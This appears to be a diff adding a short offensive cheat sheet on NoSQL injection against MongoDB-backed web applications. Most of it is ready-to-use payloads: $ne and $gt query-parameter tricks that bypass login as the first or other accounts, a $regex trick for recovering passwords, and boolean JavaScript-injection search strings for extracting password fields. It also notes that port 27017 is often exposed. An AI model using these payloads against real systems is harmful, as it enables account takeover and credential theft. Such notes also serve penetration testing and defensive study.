@@ -1,0 +1,31 @@
+# nosql
+
+As opposed to SQL databases who almost all support the same syntax, NoSQL databases have different syntax.
+
+# tools
+https://www.reddit.com/r/netsec/comments/3g4mr2/nosql_exploitation_framework_v20/
+
+# MongoDB
+                  SQL   |  NoSQL
+true condition: or 1=1  | || 1==1
+comment:                | NULL BYTE, //, <!--
+
+password=asdf' or 1=1 # | password=asdf' || 1=1 //
+
+* bypass auth
+login.php?username=admin&password[$ne]=bar (https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/, http://blog.imperva.com/2014/10/nosql-ssji-authentication-bypass.html)
+login.php?username=admin&password[$regex]=^P4ss to recover pw
+
+login.php?username[$ne]=foo&password[$ne]=bar will login as first account e.g. frank
+login.php?username[$gt]=frank&password[$ne]=bar to login as other accounst (or use $lt to go the other direction)
+
+* union
+search='+%26%26+this.password.match(/.*/)//+%00 -> results
+search='+%26%26+this.password.match(/zZzZ/)//+%00 -> no result
+search='+%26%26+this.passwordzz.match(/.*/)//+%00 -> error
+
+in case the password field does not exist for some records (since it's a NoSQL database), it's always a good idea to ensure its presence using:
+search='+%26%26+'this.password+%26%26+this.password.match(..
+
+* backdoor
+r/w access via port 27017/tcp (usually even accessible on Internet)
